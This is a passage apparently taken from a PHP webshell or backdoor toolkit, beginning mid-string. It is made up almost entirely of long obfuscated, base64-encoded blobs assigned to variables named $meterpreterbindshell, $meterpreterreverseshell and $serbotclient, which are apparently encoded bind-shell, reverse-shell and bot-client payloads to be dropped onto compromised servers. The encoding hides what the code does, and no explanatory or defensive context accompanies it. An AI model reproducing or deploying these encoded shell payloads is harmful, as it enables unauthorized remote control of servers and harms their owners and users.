lMQQtSRFh6UEZJTEVEEn5DUFBGY0xFRE9UQ1BQFAwYEBYBVEcfS2xJTEVET1QeelBGSUwYbk9UQ1BUCAYKEAoMB15XHglJCR0BDFQFBR4FHQUKChxTWHpQRklMDAJHHRAvEwcFAAQGAxFLVxYVBg8OCx8RDVdZBwcIRA0BKwICAgcQREICHBsAGx8WDAJCSEsQCgNZTxJmRURPVENQVBVULAMXABcIHwADB0RHEAwEWV9fREdIDBQOEAcCXEIZAxcQRk9pUFBGSUxFEwcdDxVYQgpRAxYKFQdYVBVFXlVQV11KC3pGSUxFRE9UQ1QfEx1MWERIU1h6UEZJTEVET1QKFlgVHA4WEB1cRxNcVkVfTERSSUNXEwJJS0wfZVRDUFBGSUxFRE8XCxQZFEEfEAYcABFYVAVFX0lJXl1KS3pGSUxFRE9UQw1QAwUfAEQGEkNYAxMLHxEWR1AAXEBKXUVFWVJURAEFDx1LRRgTVBAFEhUdHk1ADFhTXERPSVFYREgRGxkEQUBMHm5PVENQUEZJTEVEDQYGERtdY0xFRE9UQ1BQGwwAFgEUfkNQUEZJTEVET1RHHwUSVAcrAQAkEhUgNgUuDgUrXBAFEhUdHk1ADFhTXF1XQEVebk9UQ1BQRklMRUQGEktUHxMdUVhZCRUPAxVPEmZFRE9UQ1BQRklMRUQJAxEZBANBSBZISxoMFgUICh9MX2VUQ1BQRklMRURPVEMSAgMIB15uT1RDUFBGSUxFRBJ+Q1BQRklMRUQSfkNQUEZJTEVECQMRGQQDQUgWSEsbFgRZXWNMRURPVEMNekZJTEVETxIAHB8VDERBF0ZPaVBQRkkRAAgcERh6UEZJTEVESwdeMAMJCgcAEDAXERUREgxEJCIwPS01JEo6IyYvMCc3IjUnJEA2KyMrNzMgT1JmRURPVENQMBUGDw4BGysAHx4IDA8RTEsHT1QZFggIARZDUBMfAhJAV29ET1RDUFAmGgMGDwoAPAcCDx0JTUAcWEEDHwUCCRE7DAYGEQQDS0Vebk9UQ1BQRh4EDAgKXEcTTSYaAwYPCgA8AhUHDURBF0NGU0RIT0AXb0RPVENQUEZJSAoRG1ReUFdBUmZFRE9UQ1BQRgAKTRcaFhAEAk5ND0lUQ0dKUE1bSUsGAE9TSgt6RklMRURPVENQUAUBCAwWRwcWEgMSG0RBB0NHT11BT0BXb0RPVENQUEZJEUUBAwcGUBkASUQWEQ0HFwJYQgpAVUhbXUNNTUZOHRANG1NDDAxGGhkHFxsGS1QTSllAUU1PSV5QVwMRBRFDRlQYelBGSUxFRE9UQ1ASFAwNDl9lVENQUEZJTEUZChgQFQtsSUxFRE9UQ1BQRk0DEBBSHy0VHzYYCTU0AzYIETROGhkHFxsGS1QTSllASFVGXVh6UEZJTEVET1RDUBkAQUgKERtJXk0WBwUfAE0UfkNQUEZJTEVET1RDUDAVBg8OARsrFAIZEgxEQRdDUA0fFhMHDxZNVH5DUFBGSUxFRE9UQ1ASFAwNDl9lVENQUEZJTEVETwlpUFBGSUxFRE8JaVBQRklMRURPNBAfEw0MGDoTHR0XFVhCGkBBCxoATwMEFAUJC0xLGxYEWU9SZkVET1RDUA1sSUxFRE9UIwMfBQIJETsMGAwDFU5NH0xfZVRDUFAbY1Nbbg==";

$meterpreterbindshell = "blNLExgAbGNPRTAHEUMAER8FAwQATxwCHhQKDB5FCxkREQcCDx0JFkQbHAoDUBEAGA1EGxwGUBMJGx4ABxtULyA/ND1MBwEJGxEVUBUMAgENARNpU1APHUwRC08ACxVQEAAPEQ0CWmlUAAkbGEVZT0BXRERdY0gMFA4QBwJQW0lOVUpfWlNeQERSZm8NCVRLGQM5Cg0JCA4WDxVYQRoYFwEOGTwDHwUCCRE7HBERBhUUTkVMRBR+alQDFB8fCgcEVF5QAxIbCQQJMAcMExsDHTMWAR0CBgJYRB0PFV5AWxhUGRYICAEWEk4YVAAJGxgYRkZPaXkZAElEREAcBhUDHwUCRUUfTxAKFVhPUkwYbmZQEFBNRhoYFwEOGTwDHwUCCRE7DhcAFQASQUgWFhkHDBMbSklBVE1UfmoWEwoGHwBMSwcRBgMJCgdMX2V9RwMvEhAcAERSVEQDBBQMDQhDVH4eUBUKGgkMAk9cCgMvBQgACQUNGAZYVxUGDw4BGysAAhUHHQk6CAYHFxUeQUBFRR9lfUcDAhAaAwYPT0lDAx8FAgkROwwGBhEEAzYADBcbEQ1YMSA2JSshO1hDIz8lIjM2MD0xIj1cRjojKTs7NzNZS2xgBQNER1VHAhUVQEweRAsdBlhZXUkRb21LB0NNUBUGDw4BGysCExMDGRhNQBwGFQMfBQJFXm5mBwwTGwMdMwYIAAcGWFQVGxoWCwwfSkt6b00fOhAWBAZQTUZOHwoHBBEXV0tsFEwACBwRChZQTgAfOgcOGA8REgoMREIXABcIFQQ5Ch4ABRsRRFlZRhJmbEAcBhUDHwUCTFhEHBsAGxUSNg8XAQ4ABlgxIDYlKyE7WEMjPyUiMzYwPTEiPVxGOiMpOzs3M1lLbGBIFwEcVF5QAwkKBwAQMBYKHhROTR8XEhwbABtcRk0FFQULEBFcUEIZAxcQRk9peRkASUREQB0REFlQHUkIDAFHXVhQDWxgSBZEUlQQHxMNDBg6BQwXBgAETk0fFxIcGwAbWV1jZRYLDB8GBC8FBQMWAUdQEAIGFQYPDk1UfmpUAzkdFRUBT0lDVwMJCgcAEEhPaQ1QAwUfAEQUfmoUGQNBRV5uEn4KFlBOSEgWTU8PQxQZA0FFXkQSfmkDBw8dDw1ER1AQLwQfGQlMRBR+ABEDA0lLFhAdEQIdV1xJSAkBAVReUBYUDA0BTEsHT1BET1JMBxYKFQhLegUIHwBESAcMExsDHUtfREsYBh5QW0kfCgcEERcvAgMICE1AHFhDRFldSQ4XAQ4fWHoNbAAKRUxOUA8VHk9JF29tTFQ0FVAACAUJAQtUDB5QEgEJRQkOHQ1QAwkKBwAQQVRDJBgDGwlCF08aDFAHBxBMEQtPFwweBA8HGQBITwcMenlFSQ4EDQN+ahQZA0FFXm4SfkcRUFtJGQsUDhcIWFIoBQkLRkNURxwVCEBXb0ADEQ1QTUZNDT5DAxENVy1dY2ZBBk9JQ1dXXWMbDQ0DEUNYAxIbAAAKR1ABWVBaSUgJAQFdQwt6bxobDBAMHENYVBU2GBwUCl1DC3pvCg0WAU9TEAQCAwgBQl5PUAFQXltJChcBDhBLVANKSUgJAQFZEAQCCgwCTUANXUpLUAQbCQQPVH5qExEVDExCFwAXCBUEQVNMQQZPWl5QAwkKBwAQMAYGERROTR9JREsYBh5dFR0eCQEBXEcSWU9STAcWChUIS3pvFGYYbmVXQyMVEkkZFUQbHAZQAwkKBwAQTxIMAlASAQlFCQ4dDVADEggLAEQbG0MFAwNHZkEjIzshMTw1MksIFwgHDBMbQTRMWERLB1h6VCElIyclIyc4Vx0VDh8KBwQrFwkAA04xRVlPUBAvBB8ZCV5uCgICHFhCC0VebgsdBlhZXWNTW24=";

$meterpreterreverseshell = "blNLExgAbGMJFxYABjwCFRYGHhENARNLQFldY09FMAcRQwARHwUDBABPHAIeFAoMHkULGRERBwIPHQkWRBscCgNQEQAYDUQbHAZQEwkbHgAHG1QvOD81PUwHAQkbERVQFQwCAQ0BE2lTUA8dTBELTwALFVAQAA8RDQJaaVQZFklRRUNeTVFeQVBRQlRKXkRXV0tsTRwKFhtUXlBEUl1YXm5LHRMWUFtJLSM7JjomJEtsYwUDREcyIjwjI0lNWFlPBxcCAAkaREENH1hDUkpEQEVFH2V9QFAZFh9aRRYKBRYZAgMaTAcWDhcIFQQVSQ0XCxoaB1AEDgxMBAALBgYDA2xgSAwUT0lDUitER0xBDR9UTVItRFJmbEAGBAVQTUYoKjotITE3RktsFGZvDQlUS1hUAElRRUMcABEVEQs2HwoHBBEXLxMKAAkLEEhdQ1ZWRgAfOgcOGA8REgoMREECRl1DC3pvTR9FWU9QBVhSEgocX0tAD0cZABtTF0EUAAYXDVJPUmZsQBwrFwkAA0lRRUMcABEVEQtOV28ZTxEPAxUPD0xNTEsSQ01QQQ8fCgcEGxMVHkFATENCTx0QLxMHBQAEBgMRS1QWT0BMHm5mUBBQTUZNCk1ABgRPUFQWBh4RTVR+alQDOR0VFQFPSUNXAxIbCQQJSE9pDVADBR8ADQlUS1hUAElRRUMcGwAbFRI2DxcBDgAGV1lGT0pFDRwrABEcCggOCQFHUAVZWUYSZmxAHFReUFQAQUgMFAlYQyM/JSIzNjA9MSI9XEY6Iyk7OzczWUtsYEgXARxUXlAwFQYPDgEbKwAfHggMDxFMSwdPUFQPGUBFQB8bEQRZXWNlDAJPXEJUAgMaRUUfTxAKFVhPUkwYbmZQEC8EHxkJRVlPUxAfEw0MGEJfZQlDFRwVDEwebmYQChVYQQcDRRcAFwgVBEYPGQsHHFNKS3obYwUDREdVRwNZRhJMAQ0KXEQeH0YaAwYPCgBEWUtGFGZvFxgdFxMYRkFIFjsbDRMVWUYSTG8HDgcGUFcVHR4ABQJTWVBUCgwCRVlPEhEVEQJBSBZIT0BKS1AEGwkED1R+ABEDA0lLFgsMHwYEV1xJSAkBAVReUAMJCgcAEDAGBhEUTk0fSURbXVhQEhQMDQ5fZQlpGRZGQU1BCAoaSlALbGBPRTMKVAURGQoMCEULAVQXGBVGBA0MCk8HDBMbAx1CRUQ7HAYCFUEaTAsLTwMCCVASBkwGCwEACh4FA0VMFgtlfUBQEgcAAG9tCx0GWFldYxFvQA5UXlAFCBkNBg9HVi0cFQhLQEVAAxENWUtsTQAACk9JQ1QRPU4AAApIKVh6ekILTFhESFNYegcOAAAAREcHFwIcAwdEQQZGVF9QVAoMAkxEFH5qAwcPHQ8NREdQEC8EHxkJTEQUVGl5EwcaCUVDHAARFRELTlZFQA1UTU1QABsJBABHUBBcUEIFCQtJHAARHBUIQUgHTUZPQxICAwgHXm5mFwIDFUZOHwoHBBEXV0pGTQ5FSlJUEB8TDQwYOhYKFQdYVBVFTEEIChpOAwQUBQkLTEsWSllLRgseAAUET2l5DWwUZm9HTycGBFATGUwRDApUEB8TDQwYRQIABkMEGANJAQQNAVQQBBEBDEwRC08BEBVebE0rKSstNS8jK0EEHwIXABcIVy1GVExBF1R+Rzc8KSstKTc0Uw4DFxUGDw47Gw0TFVc7SVFFQBwrFwkAA1JmABIOGEtUEk9SZgENClxKS3pZV2Y=";

$serbotclient = 
"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